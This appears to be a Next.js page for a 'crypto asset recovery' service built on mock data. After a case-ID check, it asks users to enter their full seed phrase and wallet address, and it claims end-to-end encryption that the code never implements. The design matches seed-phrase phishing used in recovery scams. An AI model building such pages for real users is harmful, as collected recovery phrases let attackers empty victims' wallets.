'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { Modal } from '@/components/ui/modal';
import Input from '@/components/form/input/InputField';
import TextArea from '@/components/form/input/TextArea';

const mockCryptoAssets = [
	{
		id: 1,
		asset: 'Bitcoin',
		symbol: 'BTC',
		amount: '2.45000000',
		currentValue: '$98,450.00',
		lastKnownPrice: '$40,180.00',
		walletType: 'Hardware Wallet',
		lastAccessed: '2024-01-15',
		status: 'Inaccessible',
		recoveryMethod: 'Seed Phrase',
	},
	{
		id: 2,
		asset: 'Ethereum',
		symbol: 'ETH',
		amount: '15.75000000',
		currentValue: '$63,000.00',
		lastKnownPrice: '$2,800.00',
		walletType: 'MetaMask',
		lastAccessed: '2024-02-01',
		status: 'Lost Access',
		recoveryMethod: 'Private Key',
	},
	{
		id: 3,
		asset: 'Solana',
		symbol: 'SOL',
		amount: '450.00000000',
		currentValue: '$40,500.00',
		lastKnownPrice: '$95.00',
		walletType: 'Phantom Wallet',
		lastAccessed: '2024-01-20',
		status: 'Forgotten Password',
		recoveryMethod: 'Security Questions',
	},
	{
		id: 4,
		asset: 'Cardano',
		symbol: 'ADA',
		amount: '25000.00000000',
		currentValue: '$21,250.00',
		lastKnownPrice: '$0.85',
		walletType: 'Daedalus',
		lastAccessed: '2024-03-01',
		status: 'Hardware Failure',
		recoveryMethod: 'Recovery Phrase',
	},
	{
		id: 5,
		asset: 'Polygon',
		symbol: 'MATIC',
		amount: '8500.00000000',
		currentValue: '$7,650.00',
		lastKnownPrice: '$0.90',
		walletType: 'Trust Wallet',
		lastAccessed: '2024-02-15',
		status: 'Lost Device',
		recoveryMethod: 'Seed Phrase',
	},
];

export default function CryptoRecoveryPage() {
	const router = useRouter();
	const [showCaseIdModal, setShowCaseIdModal] = useState(false);
	const [caseId, setCaseId] = useState('');
	const [isVerified, setIsVerified] = useState(false);
	const [isVerifying, setIsVerifying] = useState(false);
	const [caseIdError, setCaseIdError] = useState('');

	const [showRecoveryModal, setShowRecoveryModal] = useState(false);
	const [recoveryPhrase, setRecoveryPhrase] = useState('');
	const [walletAddress, setWalletAddress] = useState('');
	const [additionalInfo, setAdditionalInfo] = useState('');
	const [isSubmittingRecovery, setIsSubmittingRecovery] = useState(false);
	const [recoveryError, setRecoveryError] = useState('');

	const [showSuccessModal, setShowSuccessModal] = useState(false);

	const validCaseIds = [
		'123e4567-e89b-12d3-a456-426614174000',
		'f47ac10b-58cc-4372-a567-0e02b2c3d479',
		'6ba7b810-9dad-11d1-80b4-00c04fd430c8',
		'a1b2c3d4-e5f6-7890-abcd-ef1234567890',
	];

	useEffect(() => {
		if (!isVerified) {
			setShowCaseIdModal(true);
		}
	}, [isVerified]);

	const handleCaseIdVerification = () => {
		setIsVerifying(true);
		setCaseIdError('');

		setTimeout(() => {
			const uuidRegex =
				/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

			if (!caseId.trim()) {
				setCaseIdError('Case ID is required');
				setIsVerifying(false);
				return;
			}

			if (!uuidRegex.test(caseId)) {
				setCaseIdError('Invalid Case ID format. Please enter a valid UUID.');
				setIsVerifying(false);
				return;
			}

			if (!validCaseIds.includes(caseId)) {
				setCaseIdError(
					'Case ID not found. Please check your Case ID and try again.'
				);
				setIsVerifying(false);
				return;
			}

			setIsVerified(true);
			setShowCaseIdModal(false);
			setIsVerifying(false);
		}, 1500);
	};

	const handleRecoverySubmission = () => {
		setIsSubmittingRecovery(true);
		setRecoveryError('');

		setTimeout(() => {
			if (!recoveryPhrase.trim() || !walletAddress.trim()) {
				setRecoveryError('Recovery phrase and wallet address are required');
				setIsSubmittingRecovery(false);
				return;
			}

			const words = recoveryPhrase.trim().split(/\s+/);
			if (words.length !== 12 && words.length !== 24) {
				setRecoveryError('Recovery phrase must be exactly 12 or 24 words');
				setIsSubmittingRecovery(false);
				return;
			}

			if (walletAddress.length < 26 || walletAddress.length > 62) {
				setRecoveryError('Invalid wallet address format');
				setIsSubmittingRecovery(false);
				return;
			}

			setShowRecoveryModal(false);
			setShowSuccessModal(true);
			setIsSubmittingRecovery(false);
		}, 2000);
	};

	const handleSuccessCompletion = () => {
		setShowSuccessModal(false);
		router.push('/dashboard');
	};

	const getTotalAssetValue = () => {
		return mockCryptoAssets
			.reduce((total, asset) => {
				return total + parseFloat(asset.currentValue.replace(/[\$,]/g, ''));
			}, 0)
			.toLocaleString('en-US', { style: 'currency', currency: 'USD' });
	};

	const getLastKnownValue = () => {
		return mockCryptoAssets
			.reduce((total, asset) => {
				const lastValue =
					parseFloat(asset.lastKnownPrice.replace(/[\$,]/g, '')) *
					parseFloat(asset.amount);
				return total + lastValue;
			}, 0)
			.toLocaleString('en-US', { style: 'currency', currency: 'USD' });
	};

	const getStatusBadge = (status: string) => {
		const baseClasses =
			'inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium';

		switch (status) {
			case 'Inaccessible':
				return `${baseClasses} bg-red-100 text-red-800 dark:bg-red-900/20 dark:text-red-400`;
			case 'Lost Access':
				return `${baseClasses} bg-orange-100 text-orange-800 dark:bg-orange-900/20 dark:text-orange-400`;
			case 'Forgotten Password':
				return `${baseClasses} bg-yellow-100 text-yellow-800 dark:bg-yellow-900/20 dark:text-yellow-400`;
			case 'Hardware Failure':
				return `${baseClasses} bg-purple-100 text-purple-800 dark:bg-purple-900/20 dark:text-purple-400`;
			case 'Lost Device':
				return `${baseClasses} bg-blue-100 text-blue-800 dark:bg-blue-900/20 dark:text-blue-400`;
			default:
				return `${baseClasses} bg-gray-100 text-gray-800 dark:bg-gray-900/20 dark:text-gray-400`;
		}
	};

	const getRecoveryMethodBadge = (method: string) => {
		const baseClasses =
			'inline-flex items-center px-2 py-1 rounded text-xs font-medium';

		switch (method) {
			case 'Seed Phrase':
				return `${baseClasses} bg-green-100 text-green-700 dark:bg-green-900/20 dark:text-green-400`;
			case 'Private Key':
				return `${baseClasses} bg-blue-100 text-blue-700 dark:bg-blue-900/20 dark:text-blue-400`;
			case 'Security Questions':
				return `${baseClasses} bg-purple-100 text-purple-700 dark:bg-purple-900/20 dark:text-purple-400`;
			case 'Recovery Phrase':
				return `${baseClasses} bg-indigo-100 text-indigo-700 dark:bg-indigo-900/20 dark:text-indigo-400`;
			default:
				return `${baseClasses} bg-gray-100 text-gray-700 dark:bg-gray-900/20 dark:text-gray-400`;
		}
	};

	return (
		<div className="min-h-screen bg-gray-50 dark:bg-gray-900 p-4 sm:p-6">
			<div className="max-w-7xl mx-auto">
				<div className="mb-8">
					<h1 className="text-3xl font-bold text-gray-900 dark:text-white mb-2">
						Crypto Asset Recovery
					</h1>
					<p className="text-gray-600 dark:text-gray-400">
						Recover your lost or inaccessible cryptocurrency assets securely.
					</p>
				</div>

				{isVerified ? (
					<div className="space-y-6">
						{/* Summary Cards */}
						<div className="grid grid-cols-1 md:grid-cols-4 gap-6">
							<div className="bg-white dark:bg-gray-800 rounded-2xl border border-gray-200 dark:border-gray-700 p-6">
								<div className="flex items-center justify-between">
									<div>
										<p className="text-sm font-medium text-gray-600 dark:text-gray-400">
											Current Asset Value
										</p>
										<p className="text-2xl font-bold text-gray-900 dark:text-white">
											{getTotalAssetValue()}
										</p>
									</div>
									<div className="h-12 w-12 bg-green-100 dark:bg-green-900/20 rounded-lg flex items-center justify-center">
										<svg
											className="h-6 w-6 text-green-600 dark:text-green-400"
											fill="none"
											viewBox="0 0 24 24"
											stroke="currentColor">
											<path
												strokeLinecap="round"
												strokeLinejoin="round"
												strokeWidth={2}
												d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1"
											/>
										</svg>
									</div>
								</div>
							</div>

							<div className="bg-white dark:bg-gray-800 rounded-2xl border border-gray-200 dark:border-gray-700 p-6">
								<div className="flex items-center justify-between">
									<div>
										<p className="text-sm font-medium text-gray-600 dark:text-gray-400">
											Last Known Value
										</p>
										<p className="text-2xl font-bold text-gray-900 dark:text-white">
											{getLastKnownValue()}
										</p>
									</div>
									<div className="h-12 w-12 bg-blue-100 dark:bg-blue-900/20 rounded-lg flex items-center justify-center">
										<svg
											className="h-6 w-6 text-blue-600 dark:text-blue-400"
											fill="none"
											viewBox="0 0 24 24"
											stroke="currentColor">
											<path
												strokeLinecap="round"
												strokeLinejoin="round"
												strokeWidth={2}
												d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"
											/>
										</svg>
									</div>
								</div>
							</div>

							<div className="bg-white dark:bg-gray-800 rounded-2xl border border-gray-200 dark:border-gray-700 p-6">
								<div className="flex items-center justify-between">
									<div>
										<p className="text-sm font-medium text-gray-600 dark:text-gray-400">
											Assets to Recover
										</p>
										<p className="text-2xl font-bold text-gray-900 dark:text-white">
											{mockCryptoAssets.length}
										</p>
									</div>
									<div className="h-12 w-12 bg-orange-100 dark:bg-orange-900/20 rounded-lg flex items-center justify-center">
										<svg
											className="h-6 w-6 text-orange-600 dark:text-orange-400"
											fill="none"
											viewBox="0 0 24 24"
											stroke="currentColor">
											<path
												strokeLinecap="round"
												strokeLinejoin="round"
												strokeWidth={2}
												d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"
											/>
										</svg>
									</div>
								</div>
							</div>

							<div className="bg-white dark:bg-gray-800 rounded-2xl border border-gray-200 dark:border-gray-700 p-6">
								<div className="flex items-center justify-between">
									<div>
										<p className="text-sm font-medium text-gray-600 dark:text-gray-400">
											Recovery Methods
										</p>
										<p className="text-2xl font-bold text-gray-900 dark:text-white">
											{
												new Set(
													mockCryptoAssets.map((asset) => asset.recoveryMethod)
												).size
											}
										</p>
									</div>
									<div className="h-12 w-12 bg-purple-100 dark:bg-purple-900/20 rounded-lg flex items-center justify-center">
										<svg
											className="h-6 w-6 text-purple-600 dark:text-purple-400"
											fill="none"
											viewBox="0 0 24 24"
											stroke="currentColor">
											<path
												strokeLinecap="round"
												strokeLinejoin="round"
												strokeWidth={2}
												d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"
											/>
										</svg>
									</div>
								</div>
							</div>
						</div>

						{/* Recovery Action */}
						<div className="bg-white dark:bg-gray-800 rounded-2xl border border-gray-200 dark:border-gray-700 p-6">
							<div className="flex items-center justify-between mb-6">
								<div>
									<h2 className="text-xl font-semibold text-gray-900 dark:text-white">
										Recovery Action Required
									</h2>
									<p className="text-gray-600 dark:text-gray-400 mt-1">
										Initiate recovery process for your cryptocurrency assets
									</p>
								</div>
								<button
									onClick={() => setShowRecoveryModal(true)}
									className="inline-flex items-center gap-2 bg-red-600 hover:bg-red-700 text-white px-4 py-2.5 rounded-lg font-medium transition-colors">
									<svg
										className="h-4 w-4"
										fill="none"
										viewBox="0 0 24 24"
										stroke="currentColor">
										<path
											strokeLinecap="round"
											strokeLinejoin="round"
											strokeWidth={2}
											d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"
										/>
									</svg>
									Initiate Recovery
								</button>
							</div>
						</div>

						{/* Crypto Assets Table */}
						<div className="bg-white dark:bg-gray-800 rounded-2xl border border-gray-200 dark:border-gray-700 overflow-hidden">
							<div className="px-6 py-4 border-b border-gray-200 dark:border-gray-700">
								<h2 className="text-xl font-semibold text-gray-900 dark:text-white">
									Your Crypto Assets
								</h2>
							</div>
							<div className="overflow-x-auto">
								<table className="w-full">
									<thead className="bg-gray-50 dark:bg-gray-900/50">
										<tr>
											<th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
												Asset
											</th>
											<th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
												Amount
											</th>
											<th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
												Current Value
											</th>
											<th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
												Wallet Type
											</th>
											<th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
												Status
											</th>
											<th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
												Recovery Method
											</th>
											<th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
												Last Accessed
											</th>
										</tr>
									</thead>
									<tbody className="divide-y divide-gray-200 dark:divide-gray-700">
										{mockCryptoAssets.map((asset) => (
											<tr
												key={asset.id}
												className="hover:bg-gray-50 dark:hover:bg-gray-900/50">
												<td className="px-6 py-4 whitespace-nowrap">
													<div className="flex items-center">
														<div className="h-8 w-8 bg-gradient-to-r from-blue-500 to-purple-600 rounded-full flex items-center justify-center mr-3">
															<span className="text-white text-xs font-bold">
																{asset.symbol.substring(0, 2)}
															</span>
														</div>
														<div>
															<div className="text-sm font-medium text-gray-900 dark:text-white">
																{asset.asset}
															</div>
															<div className="text-sm text-gray-500 dark:text-gray-400">
																{asset.symbol}
															</div>
														</div>
													</div>
												</td>
												<td className="px-6 py-4 whitespace-nowrap">
													<div className="text-sm font-medium text-gray-900 dark:text-white">
														{asset.amount}
													</div>
													<div className="text-sm text-gray-500 dark:text-gray-400">
														{asset.symbol}
													</div>
												</td>
												<td className="px-6 py-4 whitespace-nowrap">
													<div className="text-sm font-medium text-gray-900 dark:text-white">
														{asset.currentValue}
													</div>
													<div className="text-sm text-gray-500 dark:text-gray-400">
														Last: {asset.lastKnownPrice}
													</div>
												</td>
												<td className="px-6 py-4 whitespace-nowrap">
													<div className="text-sm text-gray-900 dark:text-white">
														{asset.walletType}
													</div>
												</td>
												<td className="px-6 py-4 whitespace-nowrap">
													<span className={getStatusBadge(asset.status)}>
														{asset.status}
													</span>
												</td>
												<td className="px-6 py-4 whitespace-nowrap">
													<span
														className={getRecoveryMethodBadge(
															asset.recoveryMethod
														)}>
														{asset.recoveryMethod}
													</span>
												</td>
												<td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500 dark:text-gray-400">
													{asset.lastAccessed}
												</td>
											</tr>
										))}
									</tbody>
								</table>
							</div>
						</div>
					</div>
				) : (
					<div className="text-center py-12">
						<div className="mx-auto h-12 w-12 text-gray-400">
							<svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
								<path
									strokeLinecap="round"
									strokeLinejoin="round"
									strokeWidth={2}
									d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
								/>
							</svg>
						</div>
						<h3 className="mt-2 text-sm font-medium text-gray-900 dark:text-white">
							Verification Required
						</h3>
						<p className="mt-1 text-sm text-gray-500 dark:text-gray-400">
							Please verify your case ID to access your crypto asset recovery
							information.
						</p>
					</div>
				)}
			</div>

			{/* Case ID Verification Modal */}
			<Modal
				isOpen={showCaseIdModal}
				onClose={() => {}}
				showCloseButton={false}
				className="max-w-md mx-4">
				<div className="p-6">
					<div className="text-center mb-6">
						<div className="mx-auto h-12 w-12 bg-blue-100 dark:bg-blue-900/20 rounded-lg flex items-center justify-center mb-4">
							<svg
								className="h-6 w-6 text-blue-600 dark:text-blue-400"
								fill="none"
								viewBox="0 0 24 24"
								stroke="currentColor">
								<path
									strokeLinecap="round"
									strokeLinejoin="round"
									strokeWidth={2}
									d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
								/>
							</svg>
						</div>
						<h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-2">
							Enter Case ID
						</h3>
						<p className="text-sm text-gray-500 dark:text-gray-400">
							Please enter your case ID to access your crypto asset recovery
							information.
						</p>
					</div>

					{caseIdError && (
						<div className="mb-4 p-3 bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded-lg">
							<p className="text-sm text-red-600 dark:text-red-400">
								{caseIdError}
							</p>
						</div>
					)}

					<div className="space-y-4">
						<div>
							<label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
								Case ID
							</label>
							<Input
								type="text"
								placeholder="e.g., 123e4567-e89b-12d3-a456-426614174000"
								defaultValue={caseId}
								onChange={(e) => setCaseId(e.target.value)}
								error={!!caseIdError}
								className="w-full"
							/>
							<p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
								Enter the UUID provided when you created your recovery case.
							</p>
						</div>

						<button
							onClick={handleCaseIdVerification}
							disabled={isVerifying}
							className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-blue-400 text-white px-4 py-2.5 rounded-lg font-medium transition-colors flex items-center justify-center gap-2">
							{isVerifying ? (
								<>
									<svg
										className="animate-spin h-4 w-4"
										fill="none"
										viewBox="0 0 24 24">
										<circle
											className="opacity-25"
											cx="12"
											cy="12"
											r="10"
											stroke="currentColor"
											strokeWidth="4"></circle>
										<path
											className="opacity-75"
											fill="currentColor"
											d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
									</svg>
									Verifying...
								</>
							) : (
								'Verify Case ID'
							)}
						</button>
					</div>

					{/* Demo helper */}
					<div className="mt-6 p-3 bg-gray-50 dark:bg-gray-800 rounded-lg">
						<p className="text-xs text-gray-600 dark:text-gray-400 mb-2">
							<strong>Demo Case IDs:</strong>
						</p>
						<div className="space-y-1">
							{validCaseIds.slice(0, 2).map((id) => (
								<button
									key={id}
									onClick={() => setCaseId(id)}
									className="text-xs text-blue-600 dark:text-blue-400 hover:underline block">
									{id}
								</button>
							))}
						</div>
					</div>
				</div>
			</Modal>

			{/* Recovery Modal */}
			<Modal
				isOpen={showRecoveryModal}
				onClose={() => setShowRecoveryModal(false)}
				className="max-w-lg mx-4">
				<div className="p-6">
					<div className="text-center mb-6">
						<div className="mx-auto h-12 w-12 bg-red-100 dark:bg-red-900/20 rounded-lg flex items-center justify-center mb-4">
							<svg
								className="h-6 w-6 text-red-600 dark:text-red-400"
								fill="none"
								viewBox="0 0 24 24"
								stroke="currentColor">
								<path
									strokeLinecap="round"
									strokeLinejoin="round"
									strokeWidth={2}
									d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"
								/>
							</svg>
						</div>
						<h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-2">
							Asset Recovery Process
						</h3>
						<p className="text-sm text-gray-500 dark:text-gray-400">
							Please provide your recovery information to regain access to your
							crypto assets.
						</p>
					</div>

					{recoveryError && (
						<div className="mb-4 p-3 bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded-lg">
							<p className="text-sm text-red-600 dark:text-red-400">
								{recoveryError}
							</p>
						</div>
					)}

					<div className="space-y-4">
						<div>
							<label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
								Recovery Phrase *
							</label>
							<TextArea
								placeholder="Enter your 12 or 24 word recovery phrase..."
								value={recoveryPhrase}
								onChange={(e) => setRecoveryPhrase(e.target.value)}
								rows={3}
								className="w-full"
							/>
							<p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
								Enter each word separated by spaces (12 or 24 words required)
							</p>
						</div>

						<div>
							<label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
								Wallet Address *
							</label>
							<Input
								type="text"
								placeholder="Enter your wallet address..."
								defaultValue={walletAddress}
								onChange={(e) => setWalletAddress(e.target.value)}
								className="w-full"
							/>
							<p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
								Your cryptocurrency wallet address
							</p>
						</div>

						<div>
							<label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
								Additional Information
							</label>
							<TextArea
								placeholder="Any additional information that might help with recovery..."
								value={additionalInfo}
								onChange={(e) => setAdditionalInfo(e.target.value)}
								rows={2}
								className="w-full"
							/>
						</div>

						<div className="flex gap-3 pt-4">
							<button
								onClick={() => setShowRecoveryModal(false)}
								className="flex-1 bg-gray-100 hover:bg-gray-200 dark:bg-gray-700 dark:hover:bg-gray-600 text-gray-700 dark:text-gray-300 px-4 py-2.5 rounded-lg font-medium transition-colors">
								Cancel
							</button>
							<button
								onClick={handleRecoverySubmission}
								disabled={isSubmittingRecovery}
								className="flex-1 bg-red-600 hover:bg-red-700 disabled:bg-red-400 text-white px-4 py-2.5 rounded-lg font-medium transition-colors flex items-center justify-center gap-2">
								{isSubmittingRecovery ? (
									<>
										<svg
											className="animate-spin h-4 w-4"
											fill="none"
											viewBox="0 0 24 24">
											<circle
												className="opacity-25"
												cx="12"
												cy="12"
												r="10"
												stroke="currentColor"
												strokeWidth="4"></circle>
											<path
												className="opacity-75"
												fill="currentColor"
												d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
										</svg>
										Processing...
									</>
								) : (
									'Submit Recovery Request'
								)}
							</button>
						</div>
					</div>

					<div className="mt-6 p-3 bg-yellow-50 dark:bg-yellow-900/20 border border-yellow-200 dark:border-yellow-800 rounded-lg">
						<div className="flex items-start gap-2">
							<svg
								className="h-4 w-4 text-yellow-600 dark:text-yellow-400 mt-0.5 flex-shrink-0"
								fill="none"
								viewBox="0 0 24 24"
								stroke="currentColor">
								<path
									strokeLinecap="round"
									strokeLinejoin="round"
									strokeWidth={2}
									d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.732-.833-2.464 0L4.35 16.5c-.77.833.192 2.5 1.732 2.5z"
								/>
							</svg>
							<div>
								<p className="text-xs font-medium text-yellow-800 dark:text-yellow-200">
									Security Notice
								</p>
								<p className="text-xs text-yellow-700 dark:text-yellow-300 mt-1">
									This process is protected by end to end encryption. Your
									recovery information will be processed securely.
								</p>
							</div>
						</div>
					</div>
				</div>
			</Modal>

			{/* Success Modal */}
			<Modal
				isOpen={showSuccessModal}
				onClose={() => {}}
				showCloseButton={false}
				className="max-w-md mx-4">
				<div className="p-6 text-center">
					<div className="mx-auto h-16 w-16 bg-green-100 dark:bg-green-900/20 rounded-full flex items-center justify-center mb-6">
						<svg
							className="h-8 w-8 text-green-600 dark:text-green-400"
							fill="none"
							viewBox="0 0 24 24"
							stroke="currentColor">
							<path
								strokeLinecap="round"
								strokeLinejoin="round"
								strokeWidth={2}
								d="M5 13l4 4L19 7"
							/>
						</svg>
					</div>

					<h3 className="text-xl font-semibold text-gray-900 dark:text-white mb-2">
						Recovery Request Submitted
					</h3>
					<p className="text-gray-600 dark:text-gray-400 mb-6">
						Your crypto asset recovery request has been successfully submitted.
						Our security team will review your information and begin the
						recovery process.
					</p>

					<div className="bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800 rounded-lg p-4 mb-6">
						<div className="flex items-start gap-3">
							<svg
								className="h-5 w-5 text-blue-600 dark:text-blue-400 mt-0.5 flex-shrink-0"
								fill="none"
								viewBox="0 0 24 24"
								stroke="currentColor">
								<path
									strokeLinecap="round"
									strokeLinejoin="round"
									strokeWidth={2}
									d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
								/>
							</svg>
							<div className="text-left">
								<p className="text-sm font-medium text-blue-900 dark:text-blue-200">
									What happens next?
								</p>
								<ul className="text-sm text-blue-800 dark:text-blue-300 mt-2 space-y-1">
									<li>• Security verification (24-48 hours)</li>
									<li>• Recovery process initiation</li>
									<li>• Asset restoration to secure wallet</li>
									<li>• Email confirmation upon completion</li>
								</ul>
							</div>
						</div>
					</div>

					<button
						onClick={handleSuccessCompletion}
						className="w-full bg-green-600 hover:bg-green-700 text-white px-6 py-3 rounded-lg font-medium transition-colors">
						Continue to Dashboard
					</button>
				</div>
			</Modal>
		</div>
	);
}
